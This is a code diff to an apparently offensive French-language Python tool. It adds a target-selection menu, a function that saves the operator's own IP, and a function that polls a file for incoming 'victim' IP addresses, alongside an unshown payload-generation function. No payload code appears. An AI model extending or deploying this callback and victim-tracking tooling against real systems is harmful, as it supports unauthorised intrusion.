@@ -9,11 +9,12 @@ TODO:
 import socket
 import os
 from colorama import Fore
-from info import Info
+from modules.info import Info
+import csv
 
 
 
-def get_ip() -> str:
+def get_self_ip() -> str:
     """
     # get_ip
     ## Presentation
@@ -50,6 +51,11 @@ def menu() -> None:
     print()
     print(Fore.GREEN,"              coded By macalamel",Fore.WHITE)
     print()
+    print(Fore.BLUE,"Nouvelle cible    [1]")
+    print("Ancienne cible    [2]")
+    choix=input(">>> ")
+    print(Fore.WHITE)
+    return choix
 
 
 def generation_vecteur(host : str, output : str = "payload") -> None:
@@ -79,5 +85,46 @@ def generation_vecteur(host : str, output : str = "payload") -> None:
 
 def save_ip(host) -> None:
     """
-    
+    # save_ip
+    ## Presentation
+    Fonction pour entregistrer l'adresse IP de l'hôte dans un fichier texte
+    ## Fonctionnement
+    * Ouvre le fichier `selfIp.txt`
+    * Remplace le contenue par `host`
+    * Ferme le fichier
+    ## Entrées
+    * host : str, Adresse IP de l'hôte
+    ## Sorties
+    Aucune sortie
     """
+    fich=open('selfIp.txt','w')
+    fich.write(host)
+    fich.close()
+
+def read_victime_ip() -> str:
+    """
+    # read_victime_ip
+    ## Presentation
+    Fonction pour lire l'adresse IP de la victime.
+    ## Fonctionnement
+    * On supprime le contenue du fichier `message.txt`
+    * On attend qu'il y a du contenue dans le fichier `message.txt`
+    * On retourne le premier élément qui est l'adresse IP de la victime
+    ## Entrées
+    Aucune entrée
+    ## Sorties
+    victime_ip : str, adresse IP de la victime
+    """
+
+    donnees=[]
+    while donnees==[]:
+        fich=open('txt_files/message.txt','r')
+        contenue = csv.reader(fich,delimiter=';')
+        donnees=[]
+        for ligne in contenue:
+            donnees.append(ligne)
+            print(ligne)
+        fich.close()
+    victime_ip : str = donnees[0][0]
+    Info.valide(f"IP de la victime trouvé : {victime_ip}")
+    return victime_ip
